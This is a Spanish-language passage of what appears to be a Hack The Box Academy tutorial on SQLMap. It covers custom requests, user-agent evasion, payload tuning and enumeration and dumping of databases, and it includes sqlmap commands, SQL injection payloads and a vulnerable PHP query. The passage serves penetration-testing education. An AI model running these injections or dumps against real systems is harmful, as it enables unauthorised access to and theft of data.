Si queríamos crear solicitudes complicadas manualmente, hay numerosos conmutadores y opciones para ajustar SQLMap.

Por ejemplo, si existe el requisito de especificar el valor de la cookie (sesión) a `PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c` opción `--cookie` se utilizaría de la siguiente manera:

  Ejecución de SQLMap en una solicitud HTTP

```shell-session
vcrdcr@htb[/htb]$ sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

El mismo efecto se puede hacer con el uso de la opción `-H/--header`:

  Ejecución de SQLMap en una solicitud HTTP

```shell-session
vcrdcr@htb[/htb]$ sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

Podemos aplicar lo mismo a opciones como `--host`, `--referer`, y `-A/--user-agent`, que se utilizan para especificar los mismos valores de encabezados HTTP.

Además, hay un interruptor `--random-agent` diseñado para seleccionar aleatoriamente a `User-agent` valor de encabezado de la base de datos incluida de valores regulares del navegador. Este es un cambio importante para recordar, ya que cada vez más soluciones de protección eliminan automáticamente todo el tráfico HTTP que contiene el valor de agente de usuario de SQLMap predeterminado reconocible (por ejemplo. `User-agent: sqlmap/1.4.9.12#dev (http://sqlmap.org)`). Alternativamente, el `--mobile` switch se puede utilizar para imitar el teléfono inteligente utilizando el mismo valor de encabezado.

Si bien SQLMap, de forma predeterminada, solo apunta a los parámetros HTTP, es posible probar los encabezados para la vulnerabilidad SQLi. La forma más fácil es especificar la marca de inyección "personalizada" después del valor del encabezado (por ejemplo. `--cookie="id=1*"`). El mismo principio se aplica a cualquier otra parte de la solicitud.

Además, si quisiéramos especificar un método HTTP alternativo, que no sea `GET` y `POST` (por ejemplo `PUT`), podemos utilizar la opción `--method`, como sigue:

  Ejecución de SQLMap en una solicitud HTTP

```shell-session
vcrdcr@htb[/htb]$ sqlmap -u www.target.com --data='id=1' --method PUT
```

---

## Solicitudes HTTP Personalizadas

Aparte de los datos de forma más comunes `POST` estilo de cuerpo (p. ej. `id=1`), SQLMap también admite formato JSON (por ejemplo. `{"id":1}`) y con formato XML (p. ej. `<element><id>1</id></element>`) Solicitudes HTTP.

El soporte para estos formatos se implementa de una manera "relajada"; por lo tanto, no hay restricciones estrictas sobre cómo se almacenan los valores de los parámetros en el interior. En caso de que el `POST` el cuerpo es relativamente simple y corto, la opción `--data` será suficiente.

Sin embargo, en el caso de un cuerpo POST complejo o largo, podemos volver a utilizar el `-r` opción:

  Ejecución de SQLMap en una solicitud HTTP

```shell-session
vcrdcr@htb[/htb]$ cat req.txt
HTTP / HTTP/1.0
Host: www.example.com

{
  "data": [{
    "type": "articles",
    "id": "1",
    "attributes": {
      "title": "Example JSON",
      "body": "Just an example",
      "created": "2020-05-22T14:56:29.000Z",
      "updated": "2020-05-22T14:56:28.000Z"
    },
    "relationships": {
      "author": {
        "data": {"id": "42", "type": "user"}
      }
    }
  }]
}
```

  Ejecución de SQLMap en una solicitud HTTP

```shell-session
vcrdcr@htb[/htb]$ sqlmap -r req.txt
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.4.9}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org


[*] starting @ 00:03:44 /2020-09-15/

[00:03:44] [INFO] parsing HTTP request from 'req.txt'
JSON data found in HTTP body. Do you want to process it? [Y/n/q] 
[00:03:45] [INFO] testing connection to the target URL
[00:03:45] [INFO] testing if the target URL content is stable
[00:03:46] [INFO] testing if HTTP parameter 'JSON type' is dynamic
[00:03:46] [WARNING] HTTP parameter 'JSON type' does not appear to be dynamic
[00:03:46] [WARNING] heuristic (basic) test shows that HTTP parameter 'JSON type' might not be injectable
```



# Manejo de errores de SQLMap

---

Podemos enfrentar muchos problemas al configurar SQLMap o usarlo con solicitudes HTTP. En esta sección, discutiremos los mecanismos recomendados para encontrar la causa y solucionarla adecuadamente.

---

## Mostrar Errores

El primer paso es generalmente cambiar el `--parse-errors`, para analizar los errores de DBMS (si los hay) y mostrarlos como parte de la ejecución del programa:

  Manejo de errores de SQLMap

```shell-session
...SNIP...
[16:09:20] [INFO] testing if GET parameter 'id' is dynamic
[16:09:20] [INFO] GET parameter 'id' appears to be dynamic
[16:09:20] [WARNING] parsed DBMS error message: 'SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '))"',),)((' at line 1'"
[16:09:20] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[16:09:20] [WARNING] parsed DBMS error message: 'SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''YzDZJELylInm' at line 1'
...SNIP...
```

Con esta opción, SQLMap imprimirá automáticamente el error DBMS, dándonos así claridad sobre cuál puede ser el problema para que podamos solucionarlo correctamente.

---

## Almacena el Tráfico

El `-t` la opción almacena todo el contenido del tráfico en un archivo de salida:

  Manejo de errores de SQLMap

```shell-session
vcrdcr@htb[/htb]$ sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt

vcrdcr@htb[/htb]$ cat /tmp/traffic.txt
HTTP request [#1]:
GET /?id=1 HTTP/1.1
Host: www.example.com
Cache-control: no-cache
Accept-encoding: gzip,deflate
Accept: */*
User-agent: sqlmap/1.4.9 (http://sqlmap.org)
Connection: close

HTTP response [#1] (200 OK):
Date: Thu, 24 Sep 2020 14:12:50 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 914
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://www.example.com:80/?id=1

<!DOCTYPE html>
<html lang="en">
...SNIP...
```

Como podemos ver en la salida anterior, el `/tmp/traffic.txt` el archivo ahora contiene todas las solicitudes HTTP enviadas y recibidas. Por lo tanto, ahora podemos investigar manualmente estas solicitudes para ver dónde está ocurriendo el problema.

---

## Salida Verbose

Otra bandera útil es la `-v` opción, que eleva el nivel de verbosidad de la salida de la consola:

  Manejo de errores de SQLMap

```shell-session
vcrdcr@htb[/htb]$ sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.9}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org


[*] starting @ 16:17:40 /2020-09-24/

[16:17:40] [DEBUG] cleaning up configuration parameters
[16:17:40] [DEBUG] setting the HTTP timeout
[16:17:40] [DEBUG] setting the HTTP User-Agent header
[16:17:40] [DEBUG] creating HTTP requests opener object
[16:17:40] [DEBUG] resolving hostname 'www.example.com'
[16:17:40] [INFO] testing connection to the target URL
[16:17:40] [TRAFFIC OUT] HTTP request [#1]:
GET /?id=1 HTTP/1.1
Host: www.example.com
Cache-control: no-cache
Accept-encoding: gzip,deflate
Accept: */*
User-agent: sqlmap/1.4.9 (http://sqlmap.org)
Connection: close

[16:17:40] [DEBUG] declared web page charset 'utf-8'
[16:17:40] [TRAFFIC IN] HTTP response [#1] (200 OK):
Date: Thu, 24 Sep 2020 14:17:40 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 914
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://www.example.com:80/?id=1

<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="">
  <meta name="author" content="">
  <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
  <title>SQLMap Essentials - Case1</title>
</head>

<body>
...SNIP...
```

Como podemos ver, el `-v 6` option imprimirá directamente todos los errores y la solicitud HTTP completa en el terminal para que podamos seguir todo lo que SQLMap está haciendo en tiempo real.

---

## Usando Proxy

Finalmente, podemos utilizar el `--proxy` opción para redirigir todo el tráfico a través de un proxy (MiTM) (por ejemplo `Burp`). Esto enrutará todo el tráfico de SQLMap `Burp`, para que luego podamos investigar manualmente todas las solicitudes, repetirlas y utilizar todas las funciones de `Burp` con estas solicitudes:

![Historial HTTP que muestra las solicitudes GET a www.example.com con varios parámetros, incluidos los intentos de inyección SQL y un código de estado 200.](https://academy.hackthebox.com/storage/modules/58/eIwJeV3.png)


# Afinación de Ataque

---

En la mayoría de los casos, SQLMap debe quedarse sin la caja con los detalles de destino proporcionados. Sin embargo, hay opciones para ajustar los intentos de inyección SQLi para ayudar a SQLMap en la fase de detección. Cada carga útil enviada al objetivo consiste en:

- vector (por ejemplo, vector `UNION ALL SELECT 1,2,VERSION()`): parte central de la carga útil, que lleva el código SQL útil que se ejecutará en el destino.
    
- límites (p. ej. `'<vector>-- -`): formaciones de prefijo y sufijo, utilizadas para la inyección adecuada del vector en la instrucción SQL vulnerable.
    

---

## Prefijo/Suffix

Existe un requisito para valores especiales de prefijo y sufijo en casos raros, no cubiertos por la ejecución normal de SQLMap.  
Para tales ejecuciones, opciones `--prefix` y `--suffix` se puede utilizar de la siguiente manera:

Código: bash

```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

Esto dará como resultado un recinto de todos los valores vectoriales entre el prefijo estático `%'))` y el sufijo `-- -`.  
Por ejemplo, si el código vulnerable en el objetivo es:

Código: php

```php
$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";
$result = mysqli_query($link, $query);
```

El vector `UNION ALL SELECT 1,2,VERSION()`, delimitado con el prefijo `%'))` y el sufijo `-- -`, dará como resultado la siguiente instrucción SQL (válida) en el destino:

Código: sql

```sql
SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1
```

---

## Nivel/Riesgo

De forma predeterminada, SQLMap combina un conjunto predefinido de límites más comunes (es decir, pares prefijo/sufijo), junto con los vectores que tienen una alta probabilidad de éxito en caso de un objetivo vulnerable. Sin embargo, existe la posibilidad de que los usuarios utilicen conjuntos más grandes de límites y vectores, ya incorporados en SQLMap.

Para tales demandas, las opciones `--level` y `--risk` debe ser utilizado:

- La opción `--level` (`1-5`, predeterminado `1`) extiende tanto los vectores como los límites que se utilizan, en función de su expectativa de éxito (es decir, cuanto menor sea la expectativa, mayor será el nivel).
    
- La opción `--risk` (`1-3`, predeterminado `1`) extiende el conjunto de vectores utilizados en función de su riesgo de causar problemas en el lado objetivo (es decir, riesgo de pérdida de entrada de la base de datos o denegación de servicio).
    

La mejor manera de verificar las diferencias entre los límites usados y las cargas útiles para diferentes valores de `--level` y `--risk`, es el uso de `-v` opción para establecer el nivel de verbosidad. En la verbosidad 3 o superior (p. ej. `-v 3`), mensajes que contienen el utilizado `[PAYLOAD]` se mostrará, de la siguiente manera:

  Afinación de Ataque

```shell-session
vcrdcr@htb[/htb]$ sqlmap -u www.example.com/?id=1 -v 3 --level=5

...SNIP...
[14:17:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:17:07] [PAYLOAD] 1) AND 5907=7031-- AuiO
[14:17:07] [PAYLOAD] 1) AND 7891=5700 AND (3236=3236
...SNIP...
[14:17:07] [PAYLOAD] 1')) AND 1049=6686 AND (('OoWT' LIKE 'OoWT
[14:17:07] [PAYLOAD] 1'))) AND 4534=9645 AND ((('DdNs' LIKE 'DdNs
[14:17:07] [PAYLOAD] 1%' AND 7681=3258 AND 'hPZg%'='hPZg
...SNIP...
[14:17:07] [PAYLOAD] 1")) AND 4540=7088 AND (("hUye"="hUye
[14:17:07] [PAYLOAD] 1"))) AND 6823=7134 AND ((("aWZj"="aWZj
[14:17:07] [PAYLOAD] 1" AND 7613=7254 AND "NMxB"="NMxB
...SNIP...
[14:17:07] [PAYLOAD] 1"="1" AND 3219=7390 AND "1"="1
[14:17:07] [PAYLOAD] 1' IN BOOLEAN MODE) AND 1847=8795#
[14:17:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
```

Por otro lado, las cargas útiles utilizadas con el valor predeterminado `--level` el valor tiene un conjunto de límites considerablemente más pequeño:

  Afinación de Ataque

```shell-session
vcrdcr@htb[/htb]$ sqlmap -u www.example.com/?id=1 -v 3
...SNIP...
[14:20:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:20:36] [PAYLOAD] 1) AND 2678=8644 AND (3836=3836
[14:20:36] [PAYLOAD] 1 AND 7496=4313
[14:20:36] [PAYLOAD] 1 AND 7036=6691-- DmQN
[14:20:36] [PAYLOAD] 1') AND 9393=3783 AND ('SgYz'='SgYz
[14:20:36] [PAYLOAD] 1' AND 6214=3411 AND 'BhwY'='BhwY
[14:20:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
```

En cuanto a los vectores, podemos comparar las cargas útiles utilizadas de la siguiente manera:

  Afinación de Ataque

```shell-session
vcrdcr@htb[/htb]$ sqlmap -u www.example.com/?id=1
...SNIP...
[14:42:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:42:38] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[14:42:38] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
...SNIP...
```

  Afinación de Ataque

```shell-session
vcrdcr@htb[/htb]$ sqlmap -u www.example.com/?id=1 --level=5 --risk=3

...SNIP...
[14:46:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:46:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[14:46:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
...SNIP...
[14:46:05] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[14:46:05] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[14:46:05] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
...SNIP...
[14:46:05] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[14:46:05] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[14:46:05] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
...SNIP...
[14:46:05] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
[14:46:06] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[14:46:06] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
...SNIP...
```

En cuanto al número de cargas útiles, por defecto (es decir. `--level=1 --risk=1`), el número de cargas útiles utilizadas para probar un solo parámetro sube a 72, mientras que en el caso más detallado (`--level=5 --risk=3`) el número de cargas útiles aumenta a 7.865.

Como SQLMap ya está sintonizado para verificar los límites y vectores más comunes, se recomienda a los usuarios habituales que no toquen estas opciones porque hará que todo el proceso de detección sea considerablemente más lento. Sin embargo, en casos especiales de vulnerabilidades SQLi, donde el uso de `OR` las cargas útiles son imprescindibles (por ejemplo, en caso de `login` páginas), es posible que tengamos que aumentar el nivel de riesgo nosotros mismos.

Esto es porque `OR` las cargas útiles son inherentemente peligrosas en una ejecución predeterminada, donde las sentencias SQL vulnerables subyacentes (aunque con menos frecuencia) están modificando activamente el contenido de la base de datos (por ejemplo. `DELETE` o `UPDATE`).

---

## Afinación Avanzada

Para afinar aún más el mecanismo de detección, hay un conjunto considerable de interruptores y opciones. En casos regulares, SQLMap no requerirá su uso. Aún así, debemos estar familiarizados con ellos para poder usarlos cuando sea necesario.

#### Códigos de Estado

Por ejemplo, cuando se trata de una gran respuesta objetivo con mucho contenido dinámico, diferencias sutiles entre `TRUE` y `FALSE` las respuestas podrían usarse con fines de detección. Si la diferencia entre `TRUE` y `FALSE` las respuestas se pueden ver en los códigos HTTP (por ejemplo. `200` para `TRUE` y `500` para `FALSE`), la opción `--code` podría usarse para fijar la detección de `TRUE` respuestas a un código HTTP específico (p. ej. `--code=200`).

#### Títulos

Si la diferencia entre las respuestas se puede ver inspeccionando los títulos de la página HTTP, el interruptor `--titles` podría usarse para instruir al mecanismo de detección para basar la comparación en función del contenido de la etiqueta HTML `<title>`.

#### Cuerdas

En caso de que aparezca un valor de cadena específico en `TRUE` respuestas (p. ej. `success`), mientras esté ausente en `FALSE` respuestas, la opción `--string` podría usarse para fijar la detección basándose únicamente en la apariencia de ese valor único (por ejemplo. `--string=success`).

#### Solo texto

Cuando se trata de una gran cantidad de contenido oculto, como ciertas etiquetas de comportamiento de página HTML (por ejemplo. `<script>`, `<style>`, `<meta>`, etc.), podemos usar el `--text-only` switch, que elimina todas las etiquetas HTML, y basa la comparación solo en el contenido textual (es decir, visible).

#### Técnicas

En algunos casos especiales, tenemos que reducir las cargas útiles utilizadas solo a un cierto tipo. Por ejemplo, si las cargas ciegas basadas en el tiempo están causando problemas en forma de tiempos de espera de respuesta, o si queremos forzar el uso de un tipo de carga útil SQLi específico, la opción `--technique` puede especificar la técnica SQLi a utilizar.

Por ejemplo, si queremos omitir las cargas útiles de SQLi ciegas y apiladas basadas en el tiempo y solo probar las cargas útiles ciegas, basadas en errores y de consulta UNION basadas en booleanos, podemos especificar estas técnicas con `--technique=BEU`.

#### SINDICATO SQLi Tuning

En algunos casos, `UNION` Las cargas útiles SQLi requieren información adicional proporcionada por el usuario para funcionar. Si podemos encontrar manualmente el número exacto de columnas de la consulta SQL vulnerable, podemos proporcionar este número a SQLMap con la opción `--union-cols` (p. ej. `--union-cols=17`). En caso de que los valores de relleno "dummy" predeterminados utilizados por SQLMap -`NULL` y los enteros aleatorios no son compatibles con los valores de los resultados de la consulta SQL vulnerable, podemos especificar un valor alternativo en su lugar (por ejemplo. `--union-char='a'`).

Además, en caso de que exista el requisito de utilizar un apéndice al final de un `UNION` consulta en forma de `FROM <table>` (por ejemplo, en el caso de Oracle), podemos configurarlo con la opción `--union-from` (p. ej. `--union-from=users`).  
No usar el adecuado `FROM` el apéndice podría deberse automáticamente a la incapacidad de detectar el nombre DBMS antes de su uso.


# Enumeración de bases de datos

---

La enumeración representa la parte central de un ataque de inyección SQL, que se realiza justo después de la detección y confirmación exitosa de la explotabilidad de la vulnerabilidad SQLi objetivo. Consiste en la búsqueda y recuperación (es decir, exfiltración) de toda la información disponible de la base de datos vulnerable.

---

## Exfiltración de Datos SQLMap

Para tal propósito, SQLMap tiene un conjunto predefinido de consultas para todos los DBMS compatibles, donde cada entrada representa el SQL que debe ejecutarse en el destino para recuperar el contenido deseado. Por ejemplo, los extractos de [consultas.xml](https://github.com/sqlmapproject/sqlmap/blob/master/data/xml/queries.xml) para un MySQL DBMS se puede ver a continuación:

Código: xml

```xml
<?xml version="1.0" encoding="UTF-8"?>

<root>
    <dbms value="MySQL">
        <!-- http://dba.fyicenter.com/faq/mysql/Difference-between-CHAR-and-NCHAR.html -->
        <cast query="CAST(%s AS NCHAR)"/>
        <length query="CHAR_LENGTH(%s)"/>
        <isnull query="IFNULL(%s,' ')"/>
...SNIP...
        <banner query="VERSION()"/>
        <current_user query="CURRENT_USER()"/>
        <current_db query="DATABASE()"/>
        <hostname query="@@HOSTNAME"/>
        <table_comment query="SELECT table_comment FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='%s' AND table_name='%s'"/>
        <column_comment query="SELECT column_comment FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema='%s' AND table_name='%s' AND column_name='%s'"/>
        <is_dba query="(SELECT super_priv FROM mysql.user WHERE user='%s' LIMIT 0,1)='Y'"/>
        <check_udf query="(SELECT name FROM mysql.func WHERE name='%s' LIMIT 0,1)='%s'"/>
        <users>
            <inband query="SELECT grantee FROM INFORMATION_SCHEMA.USER_PRIVILEGES" query2="SELECT user FROM mysql.user" query3="SELECT username FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS"/>
            <blind query="SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT %d,1" query2="SELECT DISTINCT(user) FROM mysql.user LIMIT %d,1" query3="SELECT DISTINCT(username) FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS LIMIT %d,1" count="SELECT COUNT(DISTINCT(grantee)) FROM INFORMATION_SCHEMA.USER_PRIVILEGES" count2="SELECT COUNT(DISTINCT(user)) FROM mysql.user" count3="SELECT COUNT(DISTINCT(username)) FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS"/>
        </users>
    ...SNIP...
```

Por ejemplo, si un usuario desea recuperar el "banner" (interruptor `--banner`) para el objetivo basado en MySQL DBMS, el `VERSION()` la consulta se utilizará para tal propósito.  
En caso de recuperación del nombre de usuario actual (interruptor `--current-user`), el `CURRENT_USER()` se utilizará la consulta.

Otro ejemplo es recuperar todos los nombres de usuario (es decir, etiqueta `<users>`). Hay dos consultas utilizadas, dependiendo de la situación. La consulta marcada como `inband` se utiliza en todas las situaciones no ciegas (es decir, UNION-query y SQLi basado en errores), donde los resultados de la consulta se pueden esperar dentro de la propia respuesta. La consulta marcada como `blind`, por otro lado, se usa para todas las situaciones ciegas, donde los datos deben recuperarse fila por fila, columna por columna y bit por bit.

---

## Enumeración de Datos Básicos DB

Por lo general, después de una detección exitosa de una vulnerabilidad SQLi, podemos comenzar la enumeración de detalles básicos de la base de datos, como el nombre de host del objetivo vulnerable (`--hostname`), nombre del usuario actual (`--current-user`), nombre actual de la base de datos (`--current-db`), o hashes de contraseña (`--passwords`). SQLMap omitirá la detección de SQLi si se ha identificado antes e iniciará directamente el proceso de enumeración de DBMS.

La enumeración generalmente comienza con la recuperación de la información básica:

- Banner de versión de base de datos (interruptor `--banner`)
- Nombre de usuario actual (interruptor `--current-user`)
- Nombre actual de la base de datos (interruptor `--current-db`)
- Comprobar si el usuario actual tiene derechos de DBA (administrador) (interruptor `--is-dba`)

El siguiente comando SQLMap hace todo lo anterior:

  Enumeración de bases de datos

```shell-session
vcrdcr@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba

        ___
       __H__
 ___ ___[']_____ ___ ___  {1.4.9}
|_ -| . [']     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org


[*] starting @ 13:30:57 /2020-09-17/

[13:30:57] [INFO] resuming back-end DBMS 'mysql' 
[13:30:57] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 5134=5134

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1 AND (SELECT 5907 FROM(SELECT COUNT(*),CONCAT(0x7170766b71,(SELECT (ELT(5907=5907,1))),0x7178707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x7170766b71,0x7a76726a6442576667644e6b476e577665615168564b7a696a6d4646475159716f784f5647535654,0x7178707671)-- -
---
[13:30:57] [INFO] the back-end DBMS is MySQL
[13:30:57] [INFO] fetching banner
web application technology: PHP 5.2.6, Apache 2.2.9
back-end DBMS: MySQL >= 5.0
banner: '5.1.41-3~bpo50+1'
[13:30:58] [INFO] fetching current user
current user: 'root@%'
[13:30:58] [INFO] fetching current database
current database: 'testdb'
[13:30:58] [INFO] testing if current user is DBA
[13:30:58] [INFO] fetching current user
current user is DBA: True
[13:30:58] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/www.example.com'

[*] ending @ 13:30:58 /2020-09-17/
```

En el ejemplo anterior, podemos ver que la versión de la base de datos es bastante antigua (MySQL 5.1.41 - de noviembre de 2009), y el nombre de usuario actual es `root`, mientras que el nombre actual de la base de datos es `testdb`.

Nota: El usuario 'root' en el contexto de la base de datos en la gran mayoría de los casos no tiene ninguna relación con el usuario OS "root", aparte de la representación del usuario privilegiado dentro del contexto DBMS. Esto básicamente significa que el usuario de DB no debe tener ninguna restricción dentro del contexto de la base de datos, mientras que los privilegios del sistema operativo (por ejemplo, la escritura del sistema de archivos a una ubicación arbitraria) deben ser minimalistas, al menos en las implementaciones recientes. El mismo principio se aplica para el rol genérico 'DBA'.

---

## Enumeración de Tabla

En los escenarios más comunes, después de encontrar el nombre actual de la base de datos (es decir. `testdb`), la recuperación de los nombres de tabla sería mediante el uso de `--tables` opción y especificando el nombre DB con `-D testdb`, es el siguiente:

  Enumeración de bases de datos

```shell-session
vcrdcr@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --tables -D testdb

...SNIP...
[13:59:24] [INFO] fetching tables for database: 'testdb'
Database: testdb
[4 tables]
+---------------+
| member        |
| data          |
| international |
| users         |
+---------------+
```

Después de detectar el nombre de la tabla de interés, la recuperación de su contenido se puede hacer utilizando el `--dump` opción y especificando el nombre de la tabla con `-T users`, como sigue:

  Enumeración de bases de datos

```shell-session
vcrdcr@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb

...SNIP...
Database: testdb

Table: users
[4 entries]
+----+--------+------------+
| id | name   | surname    |
+----+--------+------------+
| 1  | luther | blisset    |
| 2  | fluffy | bunny      |
| 3  | wu     | ming       |
| 4  | NULL   | nameisnull |
+----+--------+------------+

[14:07:18] [INFO] table 'testdb.users' dumped to CSV file '/home/user/.local/share/sqlmap/output/www.example.com/dump/testdb/users.csv'
```

La salida de la consola muestra que la tabla se vierte en formato CSV formateado a un archivo local `users.csv`.

Consejo: Además de CSV predeterminado, podemos especificar el formato de salida con la opción de formato de salto a HTML o SQLite, para que luego podamos investigar más a fondo el DB en un entorno SQLite.

![Tabla de base de datos que muestra columnas para el tipo de datos, nombre de tabla, nombre de columna y privilegios con entradas de muestra.](https://academy.hackthebox.com/storage/modules/58/pVBXxRz.png)

---

## Tabla/Enumeración de Row

Cuando se trata de tablas grandes con muchas columnas y/o filas, podemos especificar las columnas (por ejemplo, solo `name` y `surname` columnas) con el `-C` opción, de la siguiente manera:

  Enumeración de bases de datos

```shell-session
vcrdcr@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname

...SNIP...
Database: testdb

Table: users
[4 entries]
+--------+------------+
| name   | surname    |
+--------+------------+
| luther | blisset    |
| fluffy | bunny      |
| wu     | ming       |
| NULL   | nameisnull |
+--------+------------+
```

Para reducir las filas en función de su número ordinal(s) dentro de la tabla, podemos especificar las filas con el `--start` y `--stop` opciones (por ejemplo, comenzar desde la 2a hasta la 3a entrada), de la siguiente manera:

  Enumeración de bases de datos

```shell-session
vcrdcr@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3

...SNIP...
Database: testdb

Table: users
[2 entries]
+----+--------+---------+
| id | name   | surname |
+----+--------+---------+
| 2  | fluffy | bunny   |
| 3  | wu     | ming    |
+----+--------+---------+
```

---

## Enumeración Condicional

Si hay un requisito para recuperar ciertas filas basadas en un conocido `WHERE` condición (p. ej. `name LIKE 'f%'`), podemos usar la opción `--where`, como sigue:

  Enumeración de bases de datos

```shell-session
vcrdcr@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"

...SNIP...
Database: testdb

Table: users
[1 entry]
+----+--------+---------+
| id | name   | surname |
+----+--------+---------+
| 2  | fluffy | bunny   |
+----+--------+---------+
```

---

## Enumeración DB Completa

En lugar de recuperar contenido por tabla única, podemos recuperar todas las tablas dentro de la base de datos de interés omitiendo el uso de la opción `-T` en conjunto (p. ej. `--dump -D testdb`). Simplemente usando el interruptor `--dump` sin especificar una tabla con `-T`, se recuperará todo el contenido actual de la base de datos. En cuanto a la `--dump-all` switch, se recuperará todo el contenido de todas las bases de datos.

En tales casos, también se aconseja a un usuario que incluya el interruptor `--exclude-sysdbs` (p. ej. `--dump-all --exclude-sysdbs`), que instruirá a SQLMap para omitir la recuperación de contenido de las bases de datos del sistema, ya que generalmente es de poco interés para los pentesters.


# Enumeración Avanzada de Base de Datos

---

Ahora que hemos cubierto los conceptos básicos de la enumeración de bases de datos con SQLMap, cubriremos técnicas más avanzadas para enumerar los datos de interés en esta sección.

---

## Enumeración de esquema DB

Si quisiéramos recuperar la estructura de todas las tablas para poder tener una visión completa de la arquitectura de la base de datos, podríamos usar el switch `--schema`:

  Enumeración Avanzada de Base de Datos

```shell-session
vcrdcr@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --schema

...SNIP...
Database: master
Table: log
[3 columns]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| date   | datetime     |
| agent  | varchar(512) |
| id     | int(11)      |
+--------+--------------+

Database: owasp10
Table: accounts
[4 columns]
+-------------+---------+
| Column      | Type    |
+-------------+---------+
| cid         | int(11) |
| mysignature | text    |
| password    | text    |
| username    | text    |
+-------------+---------+
...
Database: testdb
Table: data
[2 columns]
+---------+---------+
| Column  | Type    |
+---------+---------+
| content | blob    |
| id      | int(11) |
+---------+---------+

Database: testdb
Table: users
[3 columns]
+---------+---------------+
| Column  | Type          |
+---------+---------------+
| id      | int(11)       |
| name    | varchar(500)  |
| surname | varchar(1000) |
+---------+---------------+
```

---

## Búsqueda de Datos

